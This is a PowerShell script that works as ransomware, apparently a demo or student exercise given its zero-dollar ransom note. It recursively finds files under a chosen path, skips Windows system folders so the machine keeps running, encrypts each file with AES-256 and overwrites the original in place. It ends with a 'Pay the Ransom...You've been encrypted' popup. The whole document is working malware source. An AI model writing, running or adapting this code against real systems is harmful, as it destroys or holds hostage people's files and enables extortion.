param(
    [Parameter(Mandatory = $true)]
    [string]$FilesToEncrypt,
    
    [Parameter(Mandatory = $true)]
    [string]$Storage,

    [Parameter(Mandatory = $true)]
    [string]$Password
) 

#exclude critical and useless files from being encrypting so program can run smoothly 
$ExcludePattern = "^C:\\Windows|^C:\\Program Files|^C:\\Program Files \(x86\)|^C:\\$Recycle.Bin|^C:\\System Volume Information|^C:\\Config.Msi|^C:\\MSOCache|^C:\\hiberfil.sys|^C:\\pagefile.sys|^C:\\swapfile.sys"

#Constants for encryption creation
$Algorithm = "AES"
$KeySize   = 256
$BlockSize = 128
$Mode      = "CBC"
$Padding   = "PKCS7"

# Key gen for encryption
$Salt = New-Object byte[] 16
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($Salt)

$Derive = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, 100000)
$Key  = $Derive.GetBytes($KeySize / 8)
$IV   = $Derive.GetBytes($BlockSize / 8)

#Create encryption obj
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.KeySize  = $KeySize
$AES.BlockSize = $BlockSize
$AES.Mode = $Mode
$AES.Padding = $Padding
$AES.Key = $Key
$AES.IV  = $IV

$Encryptor = $AES.CreateEncryptor()

# For Loop to get paths to each file and encrypt them
Get-ChildItem -Path $FilesToEncrypt -File -Recurse -Force -ErrorAction SilentlyContinue | 
    Where-Object { $_.FullName -notmatch $ExcludePattern } | 
    ForEach-Object {
        # Calculate new path, preserving folder structure in the output folder 
        $relativePath = $_.FullName.Substring($FilesToEncrypt.Length)
        
        # Call the existing function Protect-AesFile on each object 
        try {
            Write-Host "Encrypting: $($_.FullName)"
            #Protect-AesFile -InFile $_.FullName -OutFile $newFilePath -PasswordFile Password.txt
	    # Execution
	    $InBytes  = [System.IO.File]::ReadAllBytes($_.FullName)
	    $OutBytes = $Encryptor.TransformFinalBlock($InBytes, 0, $InBytes.Length)

	    # (needed for decryption)
	    $Final = $Salt + $IV + $OutBytes
	    [System.IO.File]::WriteAllBytes($Storage, $Final)
            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($Storage))
        }
        catch {
            Write-Warning "Unable to encrypt: $($_.FullName). Receiving error: $($_.Message)"
        }
}
$wshell = New-Object -ComObject Wscript.Shell
$result = $wshell.popup("Pay the Ransom (0 Dollars and 0 Cents)........You've been encrypted", 0)